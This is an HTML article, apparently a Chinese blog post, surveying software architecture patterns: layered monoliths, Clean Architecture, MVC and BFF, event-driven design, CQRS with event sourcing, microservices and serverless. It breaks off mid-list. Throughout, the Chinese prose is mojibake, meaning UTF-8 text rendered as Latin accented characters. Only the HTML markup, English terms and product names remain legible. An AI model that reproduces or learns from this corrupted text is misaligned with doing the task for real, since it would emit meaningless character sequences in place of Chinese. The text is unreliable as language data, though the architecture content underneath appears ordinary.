<p>ä¸‹é¢æˆ‘ä¼šæŒ‰ç…§<strong>ä»ä¼ ç»Ÿåˆ°ç°ä»£ã€ä»å•ä½“åˆ°äº‘åŸç”Ÿã€ä»ç»“æ„åˆ°å“²å­¦</strong>çš„è„‰ç»œï¼Œç³»ç»Ÿè®²è§£å¼€å‘ä¸­å¸¸ç”¨çš„å‡ ç±»æ¶æ„ï¼šå®ƒä»¬å„è‡ªè§£å†³ä»€ä¹ˆé—®é¢˜ã€å†…éƒ¨ç»“æ„æ˜¯ä»€ä¹ˆæ ·ã€åœ¨ç°ä»£å®è·µä¸­å¦‚ä½•ç»„åˆä½¿ç”¨ï¼Œä»¥åŠåœ¨ä¸åŒé¡¹ç›®é˜¶æ®µåº”å¦‚ä½•åšæ¶æ„å†³ç­–ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ä»å•ä½“åˆ†å±‚åˆ°â€œæ•´æ´å•ä½“â€ï¼šä¼ ç»Ÿæ¶æ„çš„ç°ä»£ä»·å€¼</h2>
<h3 data-id="heading-1">1. ç»å…¸åˆ†å±‚æ¶æ„ï¼šä»â€œå †ä»£ç â€åˆ°â€œæœ‰åºå•ä½“â€</h3>
<p>é•¿æœŸä»¥æ¥ï¼Œä¼ä¸šåº”ç”¨æœ€æ™®éçš„å½¢æ€æ˜¯<strong>å•ä½“+åˆ†å±‚æ¶æ„</strong>ï¼šæ•´ä¸ªç³»ç»Ÿæ‰“æˆä¸€ä¸ªåŒ…éƒ¨ç½²ï¼Œä½†å†…éƒ¨æŒ‰èŒè´£åˆ’åˆ†ä¸ºå‡ å±‚ï¼š</p>
<ul>
<li>è¡¨ç°å±‚ï¼ˆController / Viewï¼‰ï¼šå¤„ç† HTTP è¯·æ±‚ã€é¡µé¢æ¸²æŸ“ã€API è¿”å›</li>
<li>ä¸šåŠ¡å±‚ï¼ˆServiceï¼‰ï¼šå°è£…é¢†åŸŸè§„åˆ™å’Œä¸šåŠ¡æµç¨‹</li>
<li>æ•°æ®è®¿é—®å±‚ï¼ˆDAO / Repositoryï¼‰ï¼šä¸æ•°æ®åº“ã€ç¼“å­˜æ‰“äº¤é“</li>
<li>æ•°æ®åº“å±‚ï¼šMySQLã€PostgreSQLã€MongoDB ç­‰</li>
</ul>
<p>è¿™ç§ç»“æ„çš„æœ¬è´¨æ˜¯ï¼š<strong>åˆ©ç”¨â€œçºµå‘åˆ†å±‚â€è®©èŒè´£æ¸…æ™°ã€ä¾èµ–æœ‰åº</strong>ã€‚å³ä¾¿åˆ°ä»Šå¤©ï¼Œå®ƒä¾ç„¶æ˜¯ç»å¤§å¤šæ•°ä¸­å°é¡¹ç›®æœ€åˆé€‚çš„èµ·ç‚¹ã€‚</p>
<p><strong>ç°ä»£å®è·µä¸­çš„æ¼”è¿›ï¼š</strong></p>
<p>è¿‡å»çš„åˆ†å±‚å•ä½“å®¹æ˜“æ¼”å˜æˆâ€œå·¨çŸ³åº”ç”¨â€ï¼šæ‰€æœ‰ä¸šåŠ¡éƒ½å †åœ¨ä¸€ä¸ª Service åŒ…é‡Œï¼ŒService è°ƒ Service æ··ä¹±ä¸å ªã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¸šç•Œå¼€å§‹å¼•å…¥ä¸¤ç§æ€è·¯ï¼š</p>
<ol>
<li>
<p><strong>å‚ç›´åˆ‡ç‰‡ï¼ˆVertical Sliceï¼‰</strong>ï¼š<br/>
ä¸å†åªå…³æ³¨â€œæ¨ªå‘åˆ†å±‚â€ï¼Œè€Œæ˜¯åœ¨å•ä½“ä¸­æŒ‰ä¸šåŠ¡é¢†åŸŸåšâ€œçºµå‘åˆ‡å‰²â€ï¼š</p>
<pre><code class="hljs language-text" lang="text">/order
  â”œâ”€ OrderController
  â”œâ”€ OrderService
  â”œâ”€ OrderRepository
/payment
  â”œâ”€ PaymentController
  â”œâ”€ PaymentService
  â””â”€ PaymentRepository
</code></pre>
<p>æ¯ä¸ªä¸šåŠ¡åŸŸå½¢æˆç‹¬ç«‹æ¨¡å—ï¼Œå†…éƒ¨ä¾ç„¶ä¿æŒåˆ†å±‚ï¼Œä½†æ¨¡å—é—´ä¾èµ–å—æ§ã€‚è¿™è®©å•ä½“å†…éƒ¨çš„ç»„ç»‡æ›´åŠ æ¥è¿‘å¾®æœåŠ¡ï¼Œå´ä¿ç•™äº†å•ä½“çš„éƒ¨ç½²å’Œè¿ç»´ç®€å•æ€§ã€‚</p>
</li>
<li>
<p><strong>æ•´æ´æ¶æ„æ€è·¯çš„èå…¥ï¼ˆClean Architectureï¼‰</strong>ï¼š<br/>
Clean Architecture å¼ºè°ƒï¼š<strong>ä¸šåŠ¡é€»è¾‘ä¸åº”ä¾èµ–æ¡†æ¶ä¸åŸºç¡€è®¾æ–½</strong>ã€‚åº”ç”¨è¢«ç»„ç»‡æˆåŒå¿ƒåœ†ï¼š</p>
<ul>
<li>æœ€å†…å±‚ï¼šå®ä½“ / é¢†åŸŸæ¨¡å‹ï¼ˆEntitiesï¼‰</li>
<li>ä¸­å±‚ï¼šç”¨ä¾‹ / åº”ç”¨æœåŠ¡ï¼ˆUse Cases / Application Servicesï¼‰</li>
<li>å¤–å±‚ï¼šæ¥å£é€‚é…å™¨ï¼ˆControllersã€Presentersã€Gatewaysï¼‰</li>
<li>æœ€å¤–å±‚ï¼šæ¡†æ¶ä¸é©±åŠ¨ï¼ˆWeb æ¡†æ¶ã€DB é©±åŠ¨ã€æ¶ˆæ¯ä¸­é—´ä»¶ç­‰ï¼‰</li>
</ul>
<p>æ‰€æœ‰ä¾èµ–åªèƒ½â€œç”±å¤–å‘å†…â€ã€‚è¿™ä¿è¯äº†ï¼š</p>
<ul>
<li>æ ¸å¿ƒä¸šåŠ¡ä»£ç å¯ä»¥åœ¨ä¸å¯åŠ¨ Web å®¹å™¨ã€ä¸è¿æ¥æ•°æ®åº“çš„æƒ…å†µä¸‹è¢«æµ‹è¯•</li>
<li>æ›´æ¢ Web æ¡†æ¶ã€æ•°æ®åº“æˆ–æ¶ˆæ¯ä¸­é—´ä»¶æ—¶ï¼Œå¯¹å†…æ ¸å½±å“æœ‰é™</li>
</ul>
</li>
</ol>
<p>åœ¨å®æˆ˜ä¸­ï¼Œä¸€ä¸ªåšå¾—å¥½çš„â€œæ•´æ´å•ä½“â€ï¼Œå¾€å¾€æ¯”ä¸€ä¸ªæ‹†å¾—å¾ˆéšæ„çš„â€œå¾®æœåŠ¡é›†ç¾¤â€æ›´ç¨³å®šã€æ›´ç»æµã€‚</p>
<hr/>
<h2 data-id="heading-2">äºŒã€ç•Œé¢å±‚æ¶æ„ï¼šä» MVC åˆ°ç»„ä»¶åŒ–ä¸ BFF</h2>
<h3 data-id="heading-3">1. MVC / MVVMï¼šç•Œé¢å†…éƒ¨çš„ç»„ç»‡æ–¹å¼</h3>
<p>MVCï¼ˆModel-View-Controllerï¼‰æœ€åˆä½œä¸º UI æ¶æ„æ¨¡å¼ï¼Œå¼•å¯¼æˆ‘ä»¬æŠŠç•Œé¢å±•ç¤ºé€»è¾‘ä¸ä¸šåŠ¡å¤„ç†è§£è€¦ï¼š</p>
<ul>
<li>Modelï¼šæ•°æ®æ¨¡å‹å’ŒåŸºæœ¬ä¸šåŠ¡è§„åˆ™</li>
<li>Viewï¼šç•Œé¢ä¸å±•ç¤º</li>
<li>Controllerï¼šåè°ƒç”¨æˆ·è¾“å…¥ã€ä¸šåŠ¡è°ƒç”¨å’Œè§†å›¾é€‰æ‹©</li>
</ul>
<p>åœ¨åç«¯æ¡†æ¶ä¸­ï¼Œå¦‚ Spring MVCã€Djangoã€ASP.NET MVCï¼ŒMVC æ›´åƒæ˜¯â€œè¯·æ±‚-å“åº”å±‚â€çš„ç»„ç»‡æ–¹å¼ã€‚</p>
<p>è¿›å…¥å‰ç«¯ SPAï¼ˆå•é¡µåº”ç”¨ï¼‰æ—¶ä»£ï¼Œä¸»æµæ¼”å˜ä¸ºï¼š</p>
<ul>
<li><strong>MVVM</strong>ï¼ˆVueã€Knockoutï¼‰ï¼šé€šè¿‡åŒå‘ç»‘å®šï¼ŒView ä¸ ViewModel ä¹‹é—´æ•°æ®è‡ªåŠ¨åŒæ­¥</li>
<li><strong>ç»„ä»¶åŒ– + å•å‘æ•°æ®æµ</strong>ï¼ˆReactï¼‰ï¼šä¸€åˆ‡çš†ç»„ä»¶ï¼ŒçŠ¶æ€è‡ªä¸Šè€Œä¸‹ä¼ é€’ï¼Œäº‹ä»¶è‡ªä¸‹è€Œä¸Šä¼ é€’</li>
</ul>
<p>è¿™äº›éƒ½æ˜¯<strong>ç•Œé¢å±‚å†…éƒ¨çš„æ¶æ„æ¨¡å¼</strong>ï¼Œé€šå¸¸ä¼šä¸åç«¯çš„åˆ†å±‚æ¶æ„ã€å¾®æœåŠ¡æ¶æ„ç»“åˆä½¿ç”¨ã€‚</p>
<h3 data-id="heading-4">2. BFFï¼ˆBackend For Frontendï¼‰ï¼šå¤šç«¯æ—¶ä»£çš„â€œå‰åç«¯ä¸­é—´å±‚â€</h3>
<p>å½“ä¸€ä¸ªç³»ç»ŸåŒæ—¶æœåŠ¡ Webã€iOSã€Androidã€å°ç¨‹åºã€å¤šç§ç¬¬ä¸‰æ–¹ç³»ç»Ÿæ—¶ï¼Œâ€œä¸€ä¸ªåç«¯ä¾›æ‰€æœ‰å‰ç«¯ä½¿ç”¨â€å®¹æ˜“å¸¦æ¥ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<ul>
<li>API éš¾ä»¥åŒæ—¶æ»¡è¶³å¤šä¸ªå‰ç«¯å¯¹æ•°æ®å½¢æ€å’Œæ€§èƒ½çš„ä¸åŒè¯‰æ±‚</li>
<li>åç«¯ä¸ºé€‚é…å¤šä¸ªå‰ç«¯è€Œè†¨èƒ€ï¼Œæ¥å£é€»è¾‘å˜å¾—éå¸¸å¤æ‚</li>
</ul>
<p>BFF æ¨¡å¼çš„è§£å†³æ–¹å¼æ˜¯ï¼š<br/>
<strong>ä¸ºæ¯ç±»å‰ç«¯å®šåˆ¶ä¸€ä¸ªè½»é‡åç«¯å±‚</strong>ï¼Œç”±å®ƒæ¥è´Ÿè´£ï¼š</p>
<ul>
<li>èšåˆå¤šä¸ªå¾®æœåŠ¡çš„æ•°æ®ï¼Œä¸ºå‰ç«¯ç»„è£…æ‰€éœ€è§†å›¾æ¨¡å‹</li>
<li>å¤„ç†å„ç»ˆç«¯å·®å¼‚åŒ–éœ€æ±‚ï¼ˆå­—æ®µè£å‰ªã€åˆ†é¡µç­–ç•¥ã€ç¼“å­˜ç­–ç•¥ç­‰ï¼‰</li>
<li>å±è”½åç«¯æœåŠ¡æ‹“æ‰‘å˜åŒ–ï¼Œé™ä½å‰ç«¯è€¦åˆåº¦</li>
</ul>
<p>æ¶æ„ä¸Šå¸¸è§ç»„åˆæ˜¯ï¼š<br/>
<strong>â€œå¾®æœåŠ¡é›†ç¾¤â€ + â€œAPI ç½‘å…³â€ + â€œå¤šä¸ª BFF åº”ç”¨ï¼ˆæŒ‰ç«¯åˆ’åˆ†ï¼‰â€</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-5">ä¸‰ã€C/S ä¸ B/Sï¼šä»éƒ¨ç½²å½¢æ€åˆ°è¾¹ç¼˜è®¡ç®—</h2>
<p>ä¼ ç»Ÿçš„ C/Sï¼ˆå®¢æˆ·ç«¯â€“æœåŠ¡å™¨ï¼‰ä¸ B/Sï¼ˆæµè§ˆå™¨â€“æœåŠ¡å™¨ï¼‰ä¹‹åˆ†ï¼Œæœ¬è´¨ä¸Šæ˜¯**â€œè®¡ç®—ä¸çŠ¶æ€ä½äºä½•å¤„â€**çš„é—®é¢˜ï¼š</p>
<ul>
<li>C/Sï¼šåšå®¢æˆ·ç«¯ï¼Œè®¸å¤šé€»è¾‘åœ¨æœ¬åœ°è¿è¡Œï¼›æ›´æ–°æˆæœ¬é«˜ï¼Œä½†å¯ç¦»çº¿ã€å¯æ·±åº¦ä¼˜åŒ–ä½“éªŒ</li>
<li>B/Sï¼šæµè§ˆå™¨ä½œä¸ºç»Ÿä¸€è¿è¡Œæ—¶ï¼›éƒ¨ç½²æ›´æ–°é›†ä¸­åœ¨æœåŠ¡å™¨ä¾§ï¼›ä¾èµ–ç½‘ç»œè´¨é‡</li>
</ul>
<p>è¿‘å¹´æ¥è¾¹ç¼˜è®¡ç®—ã€PWAï¼ˆæ¸è¿›å¼ Web åº”ç”¨ï¼‰å…´èµ·åï¼Œè¿™ä¸¤è€…çš„ç•Œé™å˜å¾—æ¨¡ç³Šï¼š</p>
<ul>
<li>Web åº”ç”¨é€šè¿‡ Service Worker å®ç°ç¦»çº¿ç¼“å­˜ã€æœ¬åœ°å­˜å‚¨ä¸åå°åŒæ­¥ï¼Œè·å¾—ç±» C/S çš„ä½“éªŒ</li>
<li>ä¼ ç»Ÿæ¡Œé¢åº”ç”¨ä¹Ÿå¤§é‡é‡‡ç”¨ Web æŠ€æœ¯ï¼ˆå¦‚ Electronï¼‰ï¼Œæœ¬è´¨æ˜¯â€œä¸€ä¸ªå†…åµŒæµè§ˆå™¨ + æœ¬åœ°èµ„æºâ€ï¼Œä¸ B/S èåˆ</li>
</ul>
<p>ç°ä»£é¡¹ç›®é€šå¸¸ä¸å†å•çº¯è®¨è®ºâ€œé€‰ C/S è¿˜æ˜¯ B/Sâ€ï¼Œè€Œæ˜¯ç»¼åˆè€ƒè™‘ï¼š</p>
<ul>
<li>ç”¨æˆ·æ˜¯å¦éœ€è¦ç¦»çº¿è®¿é—®ã€å¤§é‡æœ¬åœ°è®¡ç®—æˆ–ç¡¬ä»¶èƒ½åŠ›</li>
<li>æ˜¯å¦æœ‰ä¸¥æ ¼çš„è¿ç»´ã€å‡çº§å’Œå®‰å…¨æ§åˆ¶è¦æ±‚</li>
<li>æ˜¯å¦éœ€è¦é€šè¿‡è¾¹ç¼˜èŠ‚ç‚¹ï¼ˆCDNã€Edge Functionï¼‰è¿›è¡Œå‰ç½®è®¡ç®—</li>
</ul>
<hr/>
<h2 data-id="heading-6">å››ã€äº‹ä»¶é©±åŠ¨æ¶æ„ï¼ˆEDAï¼‰ï¼šå‘è§£è€¦ä¸å®æ—¶æ¼”è¿›</h2>
<p>å½“ç³»ç»Ÿè§„æ¨¡å¢å¤§ã€ä¸šåŠ¡æµç¨‹å˜å¤æ‚ï¼Œä¸€ä¸ªä¸šåŠ¡åŠ¨ä½œå¾€å¾€éœ€è¦è¡ç”Ÿå‡ºå¤šç§â€œåç»­è¡Œä¸ºâ€ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>ç”¨æˆ·ä¸‹å• â†’ æ‰£åº“å­˜ â†’ å‘é€çŸ­ä¿¡é€šçŸ¥ â†’ æ¨é€æ¨è â†’ æ›´æ–°ç»Ÿè®¡æŠ¥è¡¨</li>
<li>ç”¨æˆ·æ³¨å†Œ â†’ å‘é€æ¬¢è¿é‚®ä»¶ â†’ åˆ›å»ºæ–°æ‰‹ä»»åŠ¡ â†’ å‘æ”¾ä¼˜æƒ åˆ¸</li>
</ul>
<p>ç”¨åŒæ­¥è°ƒç”¨å»ä¸²è”è¿™äº›æ­¥éª¤ï¼Œä¼šè®©æœåŠ¡é—´ä¾èµ–é“¾æ¡å†—é•¿ã€å¯é æ€§å˜å·®ã€è€¦åˆåº¦é«˜ã€‚<br/>
<strong>äº‹ä»¶é©±åŠ¨æ¶æ„</strong>é€šè¿‡â€œå‘å¸ƒ-è®¢é˜…â€çš„æ–¹å¼è§£è€¦è¿™ä¸€åˆ‡ï¼š</p>
<ol>
<li>æ ¸å¿ƒæœåŠ¡å®Œæˆä¸»ä¸šåŠ¡åï¼Œå‘å¸ƒé¢†åŸŸäº‹ä»¶ï¼ˆå¦‚ <code>OrderCreated</code>ï¼‰</li>
<li>å…¶ä»–æœåŠ¡è®¢é˜…è¿™äº›äº‹ä»¶ï¼Œæ ¹æ®éœ€è¦åšâ€œåç»­æ“ä½œâ€</li>
</ol>
<p>åº•å±‚é€šå¸¸é‡‡ç”¨æ¶ˆæ¯é˜Ÿåˆ—/æµå¤„ç†å¹³å°ï¼ˆå¦‚ Kafkaã€RabbitMQã€Pulsarï¼‰ï¼Œæ•´ä½“æ¨¡å¼å¸¦æ¥ï¼š</p>
<ul>
<li><strong>é«˜è§£è€¦</strong>ï¼šæ–°å¢ä¸€ä¸ªâ€œæ”¶åˆ°è®¢å•å°±å‘çŸ­ä¿¡â€çš„éœ€æ±‚ï¼Œåªéœ€æ–°å¢ä¸€ä¸ªæ¶ˆè´¹è€…ï¼Œä¸åŠ¨åŸæœ‰ä»£ç </li>
<li><strong>å¼‚æ­¥ä¸å‰Šå³°å¡«è°·</strong>ï¼šé«˜å³°æ—¶äº‹ä»¶æ’é˜Ÿå¤„ç†ï¼Œå¹³æ»‘åç«¯å‹åŠ›</li>
<li><strong>æ›´è‡ªç„¶åœ°æ”¯æ’‘å®æ—¶åˆ†æä¸é£æ§</strong>ï¼šåŸºäºäº‹ä»¶æµåšå®æ—¶è®¡ç®—</li>
</ul>
<p>ä½† EDA ä¹Ÿå¼•å…¥å¤æ‚æ€§ï¼š</p>
<ul>
<li><strong>ä¸€è‡´æ€§å’Œé¡ºåºæ€§</strong>ï¼šåŒä¸€è®¢å•ç›¸å…³çš„å¤šä¸ªäº‹ä»¶å¤„ç†é¡ºåºã€å¹‚ç­‰æ€§é—®é¢˜éœ€è¦è®¾è®¡</li>
<li><strong>å¯è§‚æµ‹æ€§</strong>ï¼šè°ƒç”¨é“¾ä¸å†æ˜¯ç®€å•çš„â€œå‡½æ•°æ ˆâ€ï¼Œéœ€è¦é“¾è·¯è¿½è¸ªå’Œæ—¥å¿—å…³è”</li>
<li><strong>å›¢é˜Ÿå¿ƒæ™ºæ¨¡å‹</strong>ï¼šä»â€œè¿‡ç¨‹å¼æ€ç»´â€è¿‡æ¸¡åˆ°â€œäº‹ä»¶é©±åŠ¨æ€ç»´â€æœ‰ä¸€å®šé—¨æ§›</li>
</ul>
<hr/>
<h2 data-id="heading-7">äº”ã€CQRS ä¸äº‹ä»¶æº¯æºï¼šè¯»å†™åˆ†ç¦»èƒŒåçš„æ¶æ„æ·±æ„</h2>
<p>å½“ç³»ç»Ÿçš„è¯»å†™è´Ÿè½½ã€æ€§èƒ½è¦æ±‚å’Œä¸šåŠ¡å¤æ‚åº¦ä¸æ–­æå‡æ—¶ï¼Œâ€œä¸€å¼ è¡¨åŒæ—¶æ»¡è¶³è¯»å†™â€ä¼šé‡åˆ°ç“¶é¢ˆï¼š</p>
<ul>
<li>å†™ï¼šéœ€è¦ä¸¥æ ¼çš„ä¸šåŠ¡è§„åˆ™éªŒè¯ã€ä¸€è‡´æ€§ä¿éšœã€äº‹åŠ¡å¤„ç†</li>
<li>è¯»ï¼šéœ€è¦çµæ´»å¤šå˜çš„è§†å›¾ã€å¤æ‚çš„æŸ¥è¯¢æ¡ä»¶ã€æè‡´çš„æ€§èƒ½</li>
</ul>
<p>**CQRSï¼ˆå‘½ä»¤æŸ¥è¯¢èŒè´£åˆ†ç¦»ï¼‰**å°±æ˜¯åœ¨æ¶æ„å±‚é¢å¯¹è¿™ç§çŸ›ç›¾çš„å›åº”ï¼š</p>
<ul>
<li>å†™ä¾§ï¼ˆCommand Sideï¼‰ï¼šä¸“æ³¨å¤„ç†ä¸šåŠ¡å‘½ä»¤ï¼Œç»´æŠ¤â€œäº‹å®â€ï¼Œå¼ºè°ƒå®Œæ•´æ€§å’Œä¸€è‡´æ€§</li>
<li>è¯»ä¾§ï¼ˆQuery Sideï¼‰ï¼šä¸“æ³¨ä¸ºç•Œé¢/æ¥å£æä¾›é«˜æ€§èƒ½æŸ¥è¯¢ï¼Œæ•°æ®ç»“æ„å¯ä»¥ä¸ºâ€œè¯»â€è€Œç”Ÿ</li>
</ul>
<p>åœ¨å®è·µä¸­ï¼ŒCQRS å¾€å¾€ä¸**äº‹ä»¶æº¯æºï¼ˆEvent Sourcingï¼‰**ç»“åˆï¼Œå½¢æˆä¸€ç§å¼ºåŠ›æ¨¡å¼ï¼š</p>
<ol>
<li><strong>çŠ¶æ€ä¸å†ç›´æ¥å­˜ä¸ºâ€œæœ€æ–°å¿«ç…§â€ï¼Œè€Œæ˜¯å­˜ä¸ºâ€œäº‹ä»¶åºåˆ—â€</strong>ï¼š<br/>
ä¾‹å¦‚è®¢å•çŠ¶æ€ä¸å­˜ä¸ºä¸€ä¸ª <code>status</code> å­—æ®µï¼Œè€Œæ˜¯ <code>OrderCreated</code>ã€<code>OrderPaid</code>ã€<code>OrderShipped</code> ç­‰äº‹ä»¶çš„æœ‰åºåˆ—è¡¨ã€‚</li>
<li><strong>å½“å‰çŠ¶æ€å¯é€šè¿‡é‡æ”¾äº‹ä»¶å¾—åˆ°</strong>ï¼š
<ul>
<li>å†™ä¾§åªéœ€ä¿éšœäº‹ä»¶çš„æ­£ç¡®å†™å…¥</li>
<li>è¯»ä¾§ä»äº‹ä»¶æµæ„å»ºå„ç±»â€œç‰©åŒ–è§†å›¾â€ï¼ˆMaterialized Viewsï¼‰</li>
</ul>
</li>
</ol>
<p>ä¼˜ç‚¹åŒ…æ‹¬ï¼š</p>
<ul>
<li>å¯¹è¯»å†™æ¨¡å‹è¿›è¡Œç‹¬ç«‹ä¼˜åŒ–å’Œæ¨ªå‘æ‰©å±•</li>
<li>ä»»æ„é‡å»ºæŸ¥è¯¢è§†å›¾ä»¥é€‚åº”æ–°éœ€æ±‚ï¼Œæ”¯æŒâ€œå›æ”¾å†å²â€ã€å®¡è®¡å’Œè°ƒè¯•</li>
<li>å¯¹è¯»ä¾§é‡‡ç”¨é«˜åº¦å»èŒƒå¼åŒ–çš„è¡¨ç»“æ„ï¼ŒæŸ¥è¯¢æ•ˆç‡æé«˜</li>
</ul>
<p>ä»£ä»·åˆ™æ˜¯ï¼š</p>
<ul>
<li>å¿…é¡»æ¥å—<strong>æœ€ç»ˆä¸€è‡´æ€§</strong>ï¼šè¯»ä¾§æ•°æ®å¯èƒ½æ¯”å†™ä¾§ç•¥æ»å</li>
<li>å®ç°ä¸è¿è¥å¤æ‚åº¦æé«˜ï¼Œéœ€è¦å›¢é˜Ÿåœ¨ DDDã€æ¶ˆæ¯å¤„ç†ã€å¹‚ç­‰ç­‰æ–¹é¢å…·å¤‡æˆç†Ÿç»éªŒ</li>
<li>å¹¶éé€‚åˆæ‰€æœ‰ä¸šåŠ¡ï¼Œå°¤å…¶ä¸é€‚åˆç®€å• CRUD åœºæ™¯</li>
</ul>
<hr/>
<h2 data-id="heading-8">å…­ã€å¾®æœåŠ¡æ¶æ„ï¼šä»â€œå¤§æ‹†åˆ†â€åˆ°ç²¾ç»†æ¼”è¿›</h2>
<p>å¾®æœåŠ¡ä¸åº”è¯¥è¢«çœ‹æˆä¸€ç§â€œæ½®æµâ€ï¼Œè€Œæ˜¯<strong>åœ¨ä¸šåŠ¡ä¸å›¢é˜Ÿè§„æ¨¡å‘å±•åˆ°ä¸€å®šç¨‹åº¦åï¼Œä¸ºè§£å†³å•ä½“æ¶æ„æ‰©å±•ç“¶é¢ˆçš„è‡ªç„¶ç»“æœ</strong>ã€‚</p>
<h3 data-id="heading-9">1. å¾®æœåŠ¡çš„æ ¸å¿ƒåŸåˆ™</h3>
<ul>
<li>æŒ‰<strong>ä¸šåŠ¡èƒ½åŠ›</strong>æ‹†åˆ†æœåŠ¡ï¼Œè€Œä¸æ˜¯æŒ‰æŠ€æœ¯å±‚æ¬¡æ‹†åˆ†ï¼ˆæ¯”å¦‚â€œè®¢å•æœåŠ¡â€â€œåº“å­˜æœåŠ¡â€ï¼Œè€Œä¸æ˜¯â€œå…¬å…± Service1ã€Service2â€ï¼‰</li>
<li>æ¯ä¸ªæœåŠ¡<strong>ç‹¬ç«‹éƒ¨ç½²ã€ç‹¬ç«‹æ‰©ç¼©å®¹ã€ç‹¬ç«‹æŠ€æœ¯æ ˆ</strong>ç”šè‡³ç‹¬ç«‹æ•°æ®åº“</li>
<li>æœåŠ¡é—´é€šè¿‡æ˜ç¡®å®šä¹‰çš„ API æˆ–æ¶ˆæ¯è¿›è¡Œé€šä¿¡ï¼ˆHTTP/gRPC/æ¶ˆæ¯é˜Ÿåˆ—ï¼‰</li>
</ul>
<p>å›´ç»•å¾®æœåŠ¡ï¼Œç°ä»£ä½“ç³»ä¸­å‡ ä¹æ€»ä¼šå‡ºç°çš„ä¸€æ•´å¥—åŸºç¡€è®¾æ–½ï¼š</p>
<ul>
<li><strong>API ç½‘å…³</strong>ï¼šç»Ÿä¸€å…¥å£ï¼Œè·¯ç”±ã€è®¤è¯ã€é™æµã€ç°åº¦å‘å¸ƒ</li>
<li><strong>æœåŠ¡æ³¨å†Œä¸å‘ç°</strong>ï¼šå¦‚ Nacosã€Consulï¼Œè®©æœåŠ¡çŸ¥é“â€œåˆ«äººåœ¨å“ªå„¿â€</li>
<li><strong>é…ç½®ä¸­å¿ƒ</strong>ï¼šé›†ä¸­ç®¡ç†é…ç½®å’Œå¯†é’¥</li>
<li><strong>æœåŠ¡ç½‘æ ¼ï¼ˆService Meshï¼‰</strong>ï¼šå¦‚ Istio/Linkerdï¼Œå°†æµé‡æ²»ç†ã€ç†”æ–­ã€é‡è¯•ã€æŒ‡æ ‡é‡‡é›†ä¸‹æ²‰åˆ°â€œåŸºç¡€è®¾æ–½å±‚â€</li>
<li><strong>å¯è§‚æµ‹æ€§ä½“ç³»</strong>ï¼šç»Ÿä¸€æ—¥å¿—ã€æŒ‡æ ‡ã€é“¾è·¯è¿½è¸ª</li>
</ul>
<h3 data-id="heading-10">2. å¾®æœåŠ¡ä½•æ—¶â€œå€¼å¾—ä¸Šâ€</h3>
<p>ä¸€èˆ¬å¯ä»¥ä»ä»¥ä¸‹å‡ ä¸ªç»´åº¦åˆ¤æ–­ï¼š</p>
<ul>
<li>ä¸šåŠ¡å¤æ‚åº¦ï¼šé¢†åŸŸå¤šã€è¾¹ç•Œæ¸…æ™°ï¼Œå¦‚å¤§å‹ç”µå•†ã€é‡‘èäº¤æ˜“ã€ERP å¹³å°</li>
<li>å›¢é˜Ÿè§„æ¨¡ï¼šå¤šå›¢é˜Ÿã€å¤šèŒèƒ½åä½œï¼Œéœ€è¦å„è‡ªç‹¬ç«‹è¿­ä»£å’Œéƒ¨ç½²</li>
<li>éåŠŸèƒ½æ€§éœ€æ±‚ï¼šé«˜å¯ç”¨ã€é«˜å¹¶å‘ã€å¯å¼¹æ€§æ‰©å®¹ã€å¼ºè‡ªæ²»</li>
</ul>
<p>åŒæ—¶ä¹Ÿå¿…é¡»çœ‹åˆ°å…¶æˆæœ¬ï¼š</p>
<ul>
<li>åˆ†å¸ƒå¼å¸¦æ¥çš„<strong>ä¸€è‡´æ€§ã€äº‹åŠ¡ã€è°ƒè¯•</strong>éš¾é¢˜</li>
<li>è¿ç»´ä¸ç›‘æ§å¤æ‚åº¦æ˜¾è‘—ä¸Šå‡ï¼Œå¯¹ DevOps/å¹³å°å·¥ç¨‹èƒ½åŠ›è¦æ±‚æé«˜</li>
<li>ä¸šåŠ¡åˆ’åˆ†ä¸å½“ä¼šå¯¼è‡´â€œåˆ†å¸ƒå¼å•ä½“â€ï¼Œæ—¢å¤±å»äº†å•ä½“çš„ç®€å•ï¼Œåˆæ²¡æœ‰è·å¾—çœŸæ­£çš„è§£è€¦</li>
</ul>
<p><strong>å®æˆ˜æ›´æ¨èçš„è·¯å¾„æ˜¯ï¼š</strong></p>
<blockquote>
<p>å…ˆæŠŠå•ä½“åšå¹²å‡€ â€”â€” æŒ‰é¢†åŸŸæ¨¡å—åŒ–ã€å¼•å…¥æ•´æ´æ¶æ„æ€æƒ³ã€å®Œå–„è‡ªåŠ¨åŒ–æµ‹è¯•å’Œ CI/CD â€”â€” ç­‰å•ä½“åœ¨ç»„ç»‡æˆ–æ€§èƒ½å±‚é¢çš„ç“¶é¢ˆçœŸæ­£æ˜¾ç°ï¼Œå†æœ‰è®¡åˆ’åœ°â€œæŒ‰ä¸šåŠ¡åŸŸé€æ­¥æ‹†åˆ†ä¸ºå¾®æœåŠ¡â€ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-11">ä¸ƒã€Serverlessï¼šæ— æœåŠ¡å™¨èƒŒåçš„æ–°èŒƒå¼</h2>
<p>Serverlessï¼ˆæ— æœåŠ¡å™¨æ¶æ„ï¼‰å¹¶éä¸éœ€è¦æœåŠ¡å™¨ï¼Œè€Œæ˜¯<strong>å°†æœåŠ¡å™¨çš„ç®¡ç†è´£ä»»å®Œå…¨äº¤ç»™äº‘å‚å•†</strong>ï¼Œå¼€å‘è€…åªå…³æ³¨å‡½æ•°æˆ–å°æœåŠ¡çº§åˆ«çš„ä¸šåŠ¡é€»è¾‘ï¼š</p>
<ul>
<li>FaaSï¼ˆå‡½æ•°å³æœåŠ¡ï¼‰ï¼šå¦‚ AWS Lambdaã€é˜¿é‡Œäº‘å‡½æ•°è®¡ç®—</li>
<li>Serverless å®¹å™¨ï¼šå¦‚ Cloud Runã€Fargate</li>
</ul>
<p>å…³é”®ç‰¹å¾ï¼š</p>
<ul>
<li>æŒ‰è°ƒç”¨é‡å’Œæ‰§è¡Œæ—¶é—´è®¡è´¹ï¼Œ<strong>æå¤§é€‚åˆä½é¢‘æˆ–æ³¢åŠ¨æµé‡åœºæ™¯</strong></li>
<li>è‡ªåŠ¨ä¼¸ç¼©ï¼Œæ— éœ€è‡ªå·±æ­å»ºå’Œç»´æŠ¤é›†ç¾¤</li>
<li>æ¨èç”¨äºï¼š
<ul>
